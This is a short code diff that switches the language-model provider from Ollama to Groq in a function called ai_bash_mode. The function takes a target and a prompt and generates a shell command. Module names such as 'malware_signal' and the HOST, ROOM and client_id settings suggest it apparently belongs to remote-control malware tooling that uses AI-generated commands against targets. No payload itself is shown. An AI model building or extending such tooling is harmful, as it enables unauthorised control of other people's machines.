@@ -2,7 +2,7 @@
 import asyncio
 
 from ai_utils.ai import _fallback_command, _extract_command_text
-from core.ai.ollama.ollama_provider import OllamaProvider
+from core.ai.groq.groq_provider import GroqProvider
 from malware_signal.signal import SignalClient
 from core.data.config import HOST, ROOM
 from core.data.client import client_id, username
@@ -42,7 +42,7 @@ async def ai_bash_mode(target, prompt, provider=None):
 
     if provider is None:
         try:
-            provider = OllamaProvider()
+            provider = GroqProvider()
         except Exception as exc:
             print(f"[-] AI GENERATION FAILED: {exc}; USING FALLBACK COMMAND")
             generated_command = _fallback_command(prompt)
